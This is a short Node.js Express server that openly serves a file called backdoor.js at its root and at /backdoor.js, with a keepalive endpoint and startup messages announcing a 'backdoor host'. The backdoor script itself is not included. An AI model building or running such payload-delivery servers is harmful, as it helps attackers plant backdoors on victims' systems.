const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from current directory
app.use(express.static(__dirname));

// For any route, serve the backdoor script
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Explicit route for backdoor.js
app.get('/backdoor.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Keepalive endpoint (optional)
app.get('/keepalive', (req, res) => {
    res.send('OK');
});

app.listen(PORT, () => {
    console.log(`🔗 Backdoor host running on port ${PORT}`);
    console.log(`📄 Serve backdoor.js at: /backdoor.js`);
});